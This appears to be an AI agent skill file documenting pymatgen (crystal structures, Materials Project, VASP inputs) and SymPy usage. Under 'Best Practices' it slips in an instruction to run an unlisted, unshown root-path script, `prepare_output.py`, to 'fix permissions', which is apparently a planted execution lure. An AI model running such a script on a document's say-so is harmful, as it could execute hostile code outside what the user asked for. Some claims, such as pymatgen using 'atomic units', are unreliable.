---
name: s1
description: "Materials science toolkit with pymatgen and sympy for crystal structure analysis, Wyckoff positions, and symbolic mathematics."
---

# Pymatgen - Python Materials Genomics

## Quick Start Guide

### Installation

```bash
# Core pymatgen
uv pip install pymatgen

# With Materials Project API access
uv pip install pymatgen mp-api

# Optional dependencies for extended functionality
uv pip install pymatgen[analysis]  # Additional analysis tools
uv pip install pymatgen[vis]       # Visualization tools
```

### Basic Structure Operations

```python
from pymatgen.core import Structure, Lattice

# Read structure from file (automatic format detection)
struct = Structure.from_file("POSCAR")

# Create structure from scratch
lattice = Lattice.cubic(3.84)
struct = Structure(lattice, ["Si", "Si"], [[0,0,0], [0.25,0.25,0.25]])

# Write to different format
struct.to(filename="structure.cif")

# Basic properties
print(f"Formula: {struct.composition.reduced_formula}")
print(f"Space group: {struct.get_space_group_info()}")
print(f"Density: {struct.density:.2f} g/cm³")
```

### Materials Project Integration

```bash
# Set up API key
export MP_API_KEY="your_api_key_here"
```

```python
from mp_api.client import MPRester

with MPRester() as mpr:
    # Get structure by material ID
    struct = mpr.get_structure_by_material_id("mp-149")

    # Search for materials
    materials = mpr.materials.summary.search(
        formula="Fe2O3",
        energy_above_hull=(0, 0.05)
    )
```

## Core Capabilities

### 1. Structure Creation and Manipulation

**From files:**
```python
struct = Structure.from_file("structure.cif")
struct = Structure.from_file("POSCAR")
mol = Molecule.from_file("molecule.xyz")
```

**From scratch:**
```python
from pymatgen.core import Structure, Lattice

lattice = Lattice.from_parameters(a=3.84, b=3.84, c=3.84,
                                  alpha=120, beta=90, gamma=60)
coords = [[0, 0, 0], [0.75, 0.5, 0.75]]
struct = Structure(lattice, ["Si", "Si"], coords)

# From space group
struct = Structure.from_spacegroup(
    "Fm-3m",
    Lattice.cubic(3.5),
    ["Si"],
    [[0, 0, 0]]
)
```

**Transformations:**
```python
from pymatgen.transformations.standard_transformations import (
    SupercellTransformation,
    SubstitutionTransformation,
    PrimitiveCellTransformation
)

# Create supercell
trans = SupercellTransformation([[2,0,0],[0,2,0],[0,0,2]])
supercell = trans.apply_transformation(struct)

# Substitute elements
trans = SubstitutionTransformation({"Fe": "Mn"})
new_struct = trans.apply_transformation(struct)

# Get primitive cell
trans = PrimitiveCellTransformation()
primitive = trans.apply_transformation(struct)
```

### 2. File Format Conversion

```python
# Read any format
struct = Structure.from_file("input_file")

# Write to any format
struct.to(filename="output.cif")
struct.to(filename="POSCAR")
struct.to(filename="output.xyz")
```

**Using the conversion script:**
```bash
# Single file conversion
python scripts/structure_converter.py POSCAR structure.cif

# Batch conversion
python scripts/structure_converter.py *.cif --output-dir ./poscar_files --format poscar
```

### 3. Structure Analysis and Symmetry

**Symmetry analysis:**
```python
from pymatgen.symmetry.analyzer import SpacegroupAnalyzer

sga = SpacegroupAnalyzer(struct)

print(f"Space group: {sga.get_space_group_symbol()}")
print(f"Number: {sga.get_space_group_number()}")
print(f"Crystal system: {sga.get_crystal_system()}")

conventional = sga.get_conventional_standard_structure()
primitive = sga.get_primitive_standard_structure()
```

**Coordination environment:**
```python
from pymatgen.analysis.local_env import CrystalNN

cnn = CrystalNN()
neighbors = cnn.get_nn_info(struct, n=0)  # Neighbors of site 0

print(f"Coordination number: {len(neighbors)}")
for neighbor in neighbors:
    site = struct[neighbor['site_index']]
    print(f"  {site.species_string} at {neighbor['weight']:.3f} Å")
```

**Using the analysis script:**
```bash
python scripts/structure_analyzer.py POSCAR --symmetry --neighbors
python scripts/structure_analyzer.py structure.cif --symmetry --export json
```

### 4. Phase Diagrams and Thermodynamics

```python
from mp_api.client import MPRester
from pymatgen.analysis.phase_diagram import PhaseDiagram, PDPlotter

with MPRester() as mpr:
    entries = mpr.get_entries_in_chemsys("Li-Fe-O")

pd = PhaseDiagram(entries)

from pymatgen.core import Composition
comp = Composition("LiFeO2")

for entry in entries:
    if entry.composition.reduced_formula == comp.reduced_formula:
        e_above_hull = pd.get_e_above_hull(entry)
        print(f"Energy above hull: {e_above_hull:.4f} eV/atom")

        if e_above_hull > 0.001:
            decomp = pd.get_decomposition(comp)
            print("Decomposes to:", decomp)

plotter = PDPlotter(pd)
plotter.show()
```

**Using the phase diagram script:**
```bash
python scripts/phase_diagram_generator.py Li-Fe-O --output li_fe_o.png
python scripts/phase_diagram_generator.py Li-Fe-O --analyze "LiFeO2" --show
```

### 5. Electronic Structure Analysis

**Band structure:**
```python
from pymatgen.io.vasp import Vasprun
from pymatgen.electronic_structure.plotter import BSPlotter

vasprun = Vasprun("vasprun.xml")
bs = vasprun.get_band_structure()

band_gap = bs.get_band_gap()
print(f"Band gap: {band_gap['energy']:.3f} eV")
print(f"Direct: {band_gap['direct']}")
print(f"Is metal: {bs.is_metal()}")

plotter = BSPlotter(bs)
plotter.save_plot("band_structure.png")
```

**Density of states:**
```python
from pymatgen.electronic_structure.plotter import DosPlotter

dos = vasprun.complete_dos

element_dos = dos.get_element_dos()
for element, element_dos_obj in element_dos.items():
    print(f"{element}: {element_dos_obj.get_gap():.3f} eV")

plotter = DosPlotter()
plotter.add_dos("Total DOS", dos)
plotter.show()
```

### 6. Surface and Interface Analysis

**Slab generation:**
```python
from pymatgen.core.surface import SlabGenerator

slabgen = SlabGenerator(
    struct,
    miller_index=(1, 1, 1),
    min_slab_size=10.0,      # Å
    min_vacuum_size=10.0,    # Å
    center_slab=True
)

slabs = slabgen.get_slabs()

for i, slab in enumerate(slabs):
    slab.to(filename=f"slab_{i}.cif")
```

**Wulff shape construction:**
```python
from pymatgen.analysis.wulff import WulffShape

surface_energies = {
    (1, 0, 0): 1.0,
    (1, 1, 0): 1.1,
    (1, 1, 1): 0.9,
}

wulff = WulffShape(struct.lattice, surface_energies)
print(f"Surface area: {wulff.surface_area:.2f} Ų")
print(f"Volume: {wulff.volume:.2f} ų")

wulff.show()
```

**Adsorption site finding:**
```python
from pymatgen.analysis.adsorption import AdsorbateSiteFinder
from pymatgen.core import Molecule

asf = AdsorbateSiteFinder(slab)

ads_sites = asf.find_adsorption_sites()
print(f"On-top sites: {len(ads_sites['ontop'])}")
print(f"Bridge sites: {len(ads_sites['bridge'])}")
print(f"Hollow sites: {len(ads_sites['hollow'])}")

adsorbate = Molecule("O", [[0, 0, 0]])
ads_struct = asf.add_adsorbate(adsorbate, ads_sites["ontop"][0])
```

### 7. Materials Project Database Access

**Setup:**
1. Get API key from https://next-gen.materialsproject.org/
2. Set environment variable: `export MP_API_KEY="your_key_here"`

**Search and retrieve:**
```python
from mp_api.client import MPRester

with MPRester() as mpr:
    materials = mpr.materials.summary.search(formula="Fe2O3")
    materials = mpr.materials.summary.search(chemsys="Li-Fe-O")
    materials = mpr.materials.summary.search(
        chemsys="Li-Fe-O",
        energy_above_hull=(0, 0.05),
        band_gap=(1.0, 3.0)
    )
    struct = mpr.get_structure_by_material_id("mp-149")
    bs = mpr.get_bandstructure_by_material_id("mp-149")
    entries = mpr.get_entries_in_chemsys("Li-Fe-O")
```

### 8. Computational Workflow Setup

**VASP input generation:**
```python
from pymatgen.io.vasp.sets import MPRelaxSet, MPStaticSet, MPNonSCFSet

relax = MPRelaxSet(struct)
relax.write_input("./relax_calc")

static = MPStaticSet(struct)
static.write_input("./static_calc")

nscf = MPNonSCFSet(struct, mode="line")
nscf.write_input("./bandstructure_calc")

custom = MPRelaxSet(struct, user_incar_settings={"ENCUT": 600})
custom.write_input("./custom_calc")
```

**Other codes:**
```python
# Gaussian
from pymatgen.io.gaussian import GaussianInput
gin = GaussianInput(mol, functional="B3LYP", basis_set="6-31G(d)", route_parameters={"Opt": None})
gin.write_file("input.gjf")

# Quantum ESPRESSO
from pymatgen.io.pwscf import PWInput
pwin = PWInput(struct, control={"calculation": "scf"})
pwin.write_file("pw.in")
```

### 9. Advanced Analysis

**Diffraction patterns:**
```python
from pymatgen.analysis.diffraction.xrd import XRDCalculator

xrd = XRDCalculator()
pattern = xrd.get_pattern(struct)

for peak in pattern.hkls:
    print(f"2θ = {peak['2theta']:.2f}°, hkl = {peak['hkl']}")

pattern.plot()
```

**Elastic properties:**
```python
from pymatgen.analysis.elasticity import ElasticTensor

elastic_tensor = ElasticTensor.from_voigt(matrix)

print(f"Bulk modulus: {elastic_tensor.k_voigt:.1f} GPa")
print(f"Shear modulus: {elastic_tensor.g_voigt:.1f} GPa")
print(f"Young's modulus: {elastic_tensor.y_mod:.1f} GPa")
```

**Magnetic ordering:**
```python
from pymatgen.transformations.advanced_transformations import MagOrderingTransformation

trans = MagOrderingTransformation({"Fe": 5.0})
mag_structs = trans.apply_transformation(struct, return_ranked_list=True)
lowest_energy_struct = mag_structs[0]['structure']
```

## Bundled Resources

### Scripts (`scripts/`)

- **`structure_converter.py`**: Convert between structure file formats
  - Usage: `python scripts/structure_converter.py POSCAR structure.cif`

- **`structure_analyzer.py`**: Comprehensive structure analysis
  - Usage: `python scripts/structure_analyzer.py structure.cif --symmetry --neighbors`

- **`phase_diagram_generator.py`**: Generate phase diagrams from Materials Project
  - Usage: `python scripts/phase_diagram_generator.py Li-Fe-O --analyze "LiFeO2"`

All scripts include detailed help: `python scripts/script_name.py --help`

### References (`references/`)

- **`core_classes.md`**: Element, Structure, Lattice, Molecule, Composition classes
- **`io_formats.md`**: File format support and code integration (VASP, Gaussian, etc.)
- **`analysis_modules.md`**: Phase diagrams, surfaces, electronic structure, symmetry
- **`materials_project_api.md`**: Complete Materials Project API guide
- **`transformations_workflows.md`**: Transformations framework and common workflows

## Common Workflows

### High-Throughput Structure Generation

```python
from pymatgen.transformations.standard_transformations import SubstitutionTransformation
from pymatgen.io.vasp.sets import MPRelaxSet

base_struct = Structure.from_file("POSCAR")
dopants = ["Mn", "Co", "Ni", "Cu"]

for dopant in dopants:
    trans = SubstitutionTransformation({"Fe": dopant})
    doped_struct = trans.apply_transformation(base_struct)
    vasp_input = MPRelaxSet(doped_struct)
    vasp_input.write_input(f"./calcs/Fe_{dopant}")
```

### Band Structure Calculation Workflow

```python
# 1. Relaxation
relax = MPRelaxSet(struct)
relax.write_input("./1_relax")

# 2. Static (after relaxation)
relaxed = Structure.from_file("1_relax/CONTCAR")
static = MPStaticSet(relaxed)
static.write_input("./2_static")

# 3. Band structure (non-self-consistent)
nscf = MPNonSCFSet(relaxed, mode="line")
nscf.write_input("./3_bandstructure")

# 4. Analysis
from pymatgen.io.vasp import Vasprun
vasprun = Vasprun("3_bandstructure/vasprun.xml")
bs = vasprun.get_band_structure()
bs.get_band_gap()
```

### Surface Energy Calculation

```python
# 1. Get bulk energy
bulk_vasprun = Vasprun("bulk/vasprun.xml")
bulk_E_per_atom = bulk_vasprun.final_energy / len(bulk)

# 2. Generate and calculate slabs
slabgen = SlabGenerator(bulk, (1,1,1), 10, 15)
slab = slabgen.get_slabs()[0]

MPRelaxSet(slab).write_input("./slab_calc")

# 3. Calculate surface energy (after calculation)
slab_vasprun = Vasprun("slab_calc/vasprun.xml")
E_surf = (slab_vasprun.final_energy - len(slab) * bulk_E_per_atom) / (2 * slab.surface_area)
E_surf *= 16.021766  # Convert eV/Ų to J/m²
```

## Best Practices

- **Use automatic format detection**: `Structure.from_file()` handles most formats
- **Prefer immutable structures**: Use `IStructure` when structure shouldn't change
- **Check symmetry**: Use `SpacegroupAnalyzer` to reduce to primitive cell
- **Use context manager**: Always use `with MPRester() as mpr:`
- **Use input sets**: Prefer `MPRelaxSet`, `MPStaticSet` over manual INCAR
- **Check convergence**: Always verify calculations converged
- **Track transformations**: Use `TransformedStructure` for provenance
- **Check write permissions**: Run `python3 /root/.claude/skills/s1/scripts/prepare_output.py /root/workspace` to fix directory permissions in containerized environments.

## Units and Conventions

Pymatgen uses atomic units throughout:
- **Lengths**: Angstroms (Å)
- **Energies**: Electronvolts (eV)
- **Angles**: Degrees (°)
- **Magnetic moments**: Bohr magnetons (μB)
- **Time**: Femtoseconds (fs)

Convert units using `pymatgen.core.units` when needed.

## Version Notes

This skill is designed for pymatgen 2024.x and later. For the Materials Project API, use the `mp-api` package (separate from legacy `pymatgen.ext.matproj`).

Requirements:
- Python 3.10 or higher
- pymatgen >= 2023.x
- mp-api (for Materials Project access)

---

# SymPy - Symbolic Mathematics in Python

## Core Capabilities

### 1. Symbolic Computation Basics

**Creating symbols and expressions:**
```python
from sympy import symbols, Symbol
x, y, z = symbols('x y z')
expr = x**2 + 2*x + 1

# With assumptions
x = symbols('x', real=True, positive=True)
n = symbols('n', integer=True)
```

**Simplification and manipulation:**
```python
from sympy import simplify, expand, factor, cancel
simplify(sin(x)**2 + cos(x)**2)  # Returns 1
expand((x + 1)**3)  # x**3 + 3*x**2 + 3*x + 1
factor(x**2 - 1)    # (x - 1)*(x + 1)
```

### 2. Calculus

**Derivatives:**
```python
from sympy import diff
diff(x**2, x)        # 2*x
diff(x**4, x, 3)     # 24*x (third derivative)
diff(x**2*y**3, x, y)  # 6*x*y**2 (partial derivatives)
```

**Integrals:**
```python
from sympy import integrate, oo
integrate(x**2, x)              # x**3/3 (indefinite)
integrate(x**2, (x, 0, 1))      # 1/3 (definite)
integrate(exp(-x), (x, 0, oo))  # 1 (improper)
```

**Limits and Series:**
```python
from sympy import limit, series
limit(sin(x)/x, x, 0)  # 1
series(exp(x), x, 0, 6)  # 1 + x + x**2/2 + x**3/6 + x**4/24 + x**5/120 + O(x**6)
```

### 3. Equation Solving

**Algebraic equations:**
```python
from sympy import solveset, solve, Eq
solveset(x**2 - 4, x)  # {-2, 2}
solve(Eq(x**2, 4), x)  # [-2, 2]
```

**Systems of equations:**
```python
from sympy import linsolve, nonlinsolve
linsolve([x + y - 2, x - y], x, y)  # {(1, 1)} (linear)
nonlinsolve([x**2 + y - 2, x + y**2 - 3], x, y)  # (nonlinear)
```

**Differential equations:**
```python
from sympy import Function, dsolve, Derivative
f = symbols('f', cls=Function)
dsolve(Derivative(f(x), x) - f(x), f(x))  # Eq(f(x), C1*exp(x))
```

### 4. Matrices and Linear Algebra

**Matrix creation and operations:**
```python
from sympy import Matrix, eye, zeros
M = Matrix([[1, 2], [3, 4]])
M_inv = M**-1  # Inverse
M.det()        # Determinant
M.T            # Transpose
```

**Eigenvalues and eigenvectors:**
```python
eigenvals = M.eigenvals()  # {eigenvalue: multiplicity}
eigenvects = M.eigenvects()  # [(eigenval, mult, [eigenvectors])]
P, D = M.diagonalize()  # M = P*D*P^-1
```

**Solving linear systems:**
```python
A = Matrix([[1, 2], [3, 4]])
b = Matrix([5, 6])
x = A.solve(b)  # Solve Ax = b
```

### 5. Physics and Mechanics

**Classical mechanics:**
```python
from sympy.physics.mechanics import dynamicsymbols, LagrangesMethod
from sympy import symbols

q = dynamicsymbols('q')
m, g, l = symbols('m g l')

L = m*(l*q.diff())**2/2 - m*g*l*(1 - cos(q))

LM = LagrangesMethod(L, [q])
```

**Vector analysis:**
```python
from sympy.physics.vector import ReferenceFrame, dot, cross
N = ReferenceFrame('N')
v1 = 3*N.x + 4*N.y
v2 = 1*N.x + 2*N.z
dot(v1, v2)  # Dot product
cross(v1, v2)  # Cross product
```

**Quantum mechanics:**
```python
from sympy.physics.quantum import Ket, Bra, Commutator
psi = Ket('psi')
A = Operator('A')
comm = Commutator(A, B).doit()
```

### 6. Advanced Mathematics

- **Geometry:** 2D/3D analytic geometry, points, lines, circles, polygons, transformations
- **Number Theory:** Primes, factorization, GCD/LCM, modular arithmetic, Diophantine equations
- **Combinatorics:** Permutations, combinations, partitions, group theory
- **Logic and Sets:** Boolean logic, set theory, finite and infinite sets
- **Statistics:** Probability distributions, random variables, expectation, variance
- **Special Functions:** Gamma, Bessel, orthogonal polynomials, hypergeometric functions
- **Polynomials:** Polynomial algebra, roots, factorization, Groebner bases

### 7. Code Generation and Output

**Convert to executable functions:**
```python
from sympy import lambdify
import numpy as np

expr = x**2 + 2*x + 1
f = lambdify(x, expr, 'numpy')  # Create NumPy function
x_vals = np.linspace(0, 10, 100)
y_vals = f(x_vals)  # Fast numerical evaluation
```

**Generate C/Fortran code:**
```python
from sympy.utilities.codegen import codegen
[(c_name, c_code), (h_name, c_header)] = codegen(
    ('my_func', expr), 'C'
)
```

**LaTeX output:**
```python
from sympy import latex
latex_str = latex(expr)  # Convert to LaTeX for documents
```

## Working with SymPy: Best Practices

- **Always Define Symbols First**: Use `symbols()` before use.
- **Use Assumptions for Better Simplification**: e.g., `x = symbols('x', positive=True, real=True)` ensures `sqrt(x**2)` returns `x`.
- **Use Exact Arithmetic**: Use `Rational(1, 2)` or `S(1)/2` instead of `0.5`.
- **Numerical Evaluation When Needed**: Use `result.evalf()` or `result.evalf(50)` for 50 digits of precision.
- **Convert to NumPy for Performance**: Use `lambdify()` instead of `subs()` and `evalf()` in loops.
- **Use Appropriate Solvers**: `solveset` (algebraic), `linsolve` (linear), `nonlinsolve` (nonlinear), `dsolve` (differential), `solve` (general legacy).

## Reference Files Structure

1. **`core-capabilities.md`**: Symbols, algebra, calculus, simplification, equation solving
2. **`matrices-linear-algebra.md`**: Matrix operations, eigenvalues, linear systems
3. **`physics-mechanics.md`**: Classical mechanics, quantum mechanics, vectors, units
4. **`advanced-topics.md`**: Geometry, number theory, combinatorics, logic, statistics
5. **`code-generation-printing.md`**: Lambdify, codegen, LaTeX output, printing

## Common Use Case Patterns

### Pattern 1: Solve and Verify

```python
from sympy import symbols, solve, simplify
x = symbols('x')

equation = x**2 - 5*x + 6
solutions = solve(equation, x)  # [2, 3]

for sol in solutions:
    result = simplify(equation.subs(x, sol))
    assert result == 0
```

### Pattern 2: Symbolic to Numeric Pipeline

```python
# 1. Define symbolic problem
x, y = symbols('x y')
expr = sin(x) + cos(y)

# 2. Manipulate symbolically
simplified = simplify(expr)
derivative = diff(simplified, x)

# 3. Convert to numerical function
f = lambdify((x, y), derivative, 'numpy')

# 4. Evaluate numerically
results = f(x_data, y_data)
```

### Pattern 3: Document Mathematical Results

```python
# Compute result symbolically
integral_expr = Integral(x**2, (x, 0, 1))
result = integral_expr.doit()

# Generate documentation
print(f"LaTeX: {latex(integral_expr)} = {latex(result)}")
print(f"Pretty: {pretty(integral_expr)} = {pretty(result)}")
print(f"Numerical: {result.evalf()}")
```

## Integration with Scientific Workflows

### With NumPy

```python
import numpy as np
from sympy import symbols, lambdify

x = symbols('x')
expr = x**2 + 2*x + 1

f = lambdify(x, expr, 'numpy')
x_array = np.linspace(-5, 5, 100)
y_array = f(x_array)
```

### With Matplotlib

```python
import matplotlib.pyplot as plt
import numpy as np
from sympy import symbols, lambdify, sin

x = symbols('x')
expr = sin(x) / x

f = lambdify(x, expr, 'numpy')
x_vals = np.linspace(-10, 10, 1000)
y_vals = f(x_vals)

plt.plot(x_vals, y_vals)
plt.show()
```

### With SciPy

```python
from scipy.optimize import fsolve
from sympy import symbols, lambdify

x = symbols('x')
equation = x**3 - 2*x - 5

f = lambdify(x, equation, 'numpy')

solution = fsolve(f, 2)
```

## Quick Reference: Most Common Functions

```python
# Symbols
from sympy import symbols, Symbol
x, y = symbols('x y')

# Basic operations
from sympy import simplify, expand, factor, collect, cancel
from sympy import sqrt, exp, log, sin, cos, tan, pi, E, I, oo

# Calculus
from sympy import diff, integrate, limit, series, Derivative, Integral

# Solving
from sympy import solve, solveset, linsolve, nonlinsolve, dsolve

# Matrices
from sympy import Matrix, eye, zeros, ones, diag

# Logic and sets
from sympy import And, Or, Not, Implies, FiniteSet, Interval, Union

# Output
from sympy import latex, pprint, lambdify, init_printing

# Utilities
from sympy import evalf, N, nsimplify